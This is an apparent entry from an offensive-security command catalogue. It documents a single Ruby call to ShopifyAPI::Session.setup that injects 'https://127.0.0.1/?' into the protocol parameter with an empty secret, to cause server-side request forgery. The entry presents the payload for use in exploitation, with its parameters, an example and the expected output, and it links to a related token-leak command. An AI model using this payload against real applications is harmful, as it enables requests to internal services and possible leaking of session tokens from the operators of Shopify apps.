---
id: cmd-uuid-8
data: 'ShopifyAPI::Session.setup protocol:''https://127.0.0.1/?'',secret:'''''
tags:
  - exploitation
  - ssrf
  - shopify
type: command
output: 'Configuration applied, leading to SSRF'
executor: ruby
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.711Z'
verified: false
validated: true
submitted: true
---
# setup-session-with-malicious-protocol

## Command

```ruby
ShopifyAPI::Session.setup protocol:'https://127.0.0.1/?',secret:''
```

## Description

Configures session with injected protocol containing host and path for SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| protocol | Malicious URL ('https://127.0.0.1/?') | Yes |
| secret | Empty | Yes |

## Examples

### Basic Usage

```ruby
ShopifyAPI::Session.setup protocol:'https://127.0.0.1/?',secret:''
```

## Expected Output

Configuration applied; enables protocol-based SSRF.

## Related

- [[commands/request-token-with-leak]]
